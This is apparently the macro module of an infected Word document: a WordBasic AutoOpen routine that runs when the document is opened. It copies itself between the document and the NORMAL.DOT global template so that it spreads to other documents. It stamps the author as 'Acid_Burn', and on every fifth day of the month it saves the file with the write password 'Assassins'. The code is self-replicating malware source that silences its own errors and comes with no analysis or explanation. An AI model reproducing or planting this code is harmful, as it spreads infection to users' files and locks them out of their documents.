   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim TagNummer
   Dim F$
   Dim G$
   Dim M$
   On Error GoTo -1: On Error GoTo MinSize
   WordBasic.FileSummaryInfo Author:="Acid_Burn"
   TagNummer = WordBasic.Day(WordBasic.Now())
   Select Case TagNummer
           Case 5, 10, 15, 20, 25, 30
               WordBasic.FileSaveAs WritePassword:="Assassins"
           Case Else
   End Select
   F$ = WordBasic.[FileName$]() + ":AutoOpen"
   G$ = "Global:AutoOpen"
   M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If M$ = "NORMAL.DOT" Then
   WordBasic.MacroCopy G$, F$
   WordBasic.FileSaveAs Format:=1
   Else
   WordBasic.MacroCopy F$, G$
   End If
   MinSize:
   End Sub
